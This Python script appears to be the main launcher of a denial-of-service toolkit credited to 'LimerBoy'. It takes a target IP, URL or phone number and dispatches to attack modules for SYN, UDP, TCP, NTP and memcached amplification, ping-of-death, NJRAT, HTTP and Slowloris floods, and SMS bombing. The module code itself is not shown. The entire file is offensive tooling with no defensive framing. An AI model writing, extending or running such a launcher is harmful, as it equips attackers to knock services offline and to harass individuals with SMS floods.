# Created by LimerBoy
import argparse
try:
	import tools.addons.clean
	import tools.addons.winpcap
	import tools.addons.logo
except ImportError:
	print("Failed import some modules")

def main():

	# Parse args
	parser = argparse.ArgumentParser(description = "Denial-of-service ToolKit")
	parser.add_argument("--target", type = str, metavar = "<IP:PORT, URL, PHONE>",
					help = "Target ip:port, url or phone")
	parser.add_argument("--method", type = str, metavar = "<SMS/NTP/TCP/UDP/SYN/POD/SLOWLORIS/MEMCACHED/HTTP/NJRAT>",
					help = "Attack method")
	parser.add_argument("--time", type = int, default = 10, metavar = "<time>",
					help = 'time in secounds')
	parser.add_argument("--threads", type = int, default = 3, metavar = "<threads>",
					help = "threads count (1-200)")

	# Get args
	args = parser.parse_args()
	threads = args.threads
	time = args.time
	method = str(args.method).upper()
	target = args.target

	if method == "NTP":
		from tools.L4.ntp import NTP_ATTACK
		NTP_ATTACK(threads, time, target)

	elif method == "SYN":
		from tools.L4.syn import SYN_ATTACK
		SYN_ATTACK(threads, time, target)

	elif method == "TCP":
		from tools.L4.tcp import TCP_ATTACK
		TCP_ATTACK(threads, time, target)

	elif method == "POD":
		from tools.L4.pod import POD_ATTACK
		POD_ATTACK(threads, time, target)

	elif method == "NJRAT":
		from tools.L4.njrat import NJRAT_ATTACK
		NJRAT_ATTACK(threads, time, target)

	elif method == "UDP":
		from tools.L4.udp import UDP_ATTACK
		UDP_ATTACK(threads, time, target)

	elif method == "HTTP":
		from tools.L7.http import HTTP_ATTACK
		HTTP_ATTACK(threads, time, target)

	elif method == "SLOWLORIS":
		from tools.L7.slowloris import SLOWLORIS_ATTACK
		SLOWLORIS_ATTACK(threads, time, target)
	
	elif method == "MEMCACHED":
		from tools.L4.memcached import MEMCACHED_ATTACK
		MEMCACHED_ATTACK(threads, time, target)

	elif method == "SMS":
		from tools.SMS.main import SMS_ATTACK
		SMS_ATTACK(threads, time, target)

	else:
		parser.print_help()

if __name__ == '__main__':
	main()
